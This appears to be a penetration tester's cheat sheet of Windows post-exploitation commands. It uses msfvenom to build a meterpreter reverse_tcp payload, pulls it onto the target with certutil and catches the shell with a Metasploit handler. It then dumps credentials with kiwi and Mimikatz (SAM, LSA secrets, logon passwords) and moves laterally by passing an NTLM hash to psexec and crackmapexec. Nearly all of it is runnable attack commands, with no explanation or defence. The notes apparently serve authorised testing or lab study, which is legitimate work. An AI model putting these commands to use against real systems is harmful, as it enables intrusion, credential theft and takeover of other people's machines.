
```bash
# Exploitation
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<TARGET_IP> LPORT=1234 -f exe > payload.exe

python -m SimpleHTTPServer 80

## METASPLOIT
setg RHOSTS <TARGET_IP>
setg RHOST <TARGET_IP>

use exploit/multi/handler 
set payload windows/x64/meterpreter/reverse_tcp
set LHOST <LOCAL_HOST_IP>
set LPORT <LOCAL_PORT>
run

## On target system
certutil -urlcache -f http://<TARGET_IP>/payload.exe payload.exe
# Run payload.exe

# METASPLOIT - Meterpreter
sysinfo
getuid
pgrep lsass
migrate <explorer_PID>
getprivs

# Creds dumping - Meterpreter
load kiwi
creds_all
lsa_dump_sam
lsa_dump_secrets

# MIMIKATZ
cd C:\\
mkdir Temp
cd Temp
upload /usr/share/windows-resources/mimikatz/x64/mimikatz.exe
shell

mimikatz.exe
privilege::debug
lsadump::sam
lsadump::secrets
sekurlsa::logonPasswords

# PASS THE HASH
## sekurlsa::logonPasswords
background
search psexec
use exploit/windows/smb/psexec
set LPORT <LOCAL_PORT2>
set SMBUser Administrator
set SMBPass <ADMINISTRATOR_LM:NTLM_HASH>
exploit
```

### CRACKMAPEXEC
```bash
crackmapexec smb <TARGET_IP> -u Administrator -H "<NTLM_HASH>" -x "whoami"
```
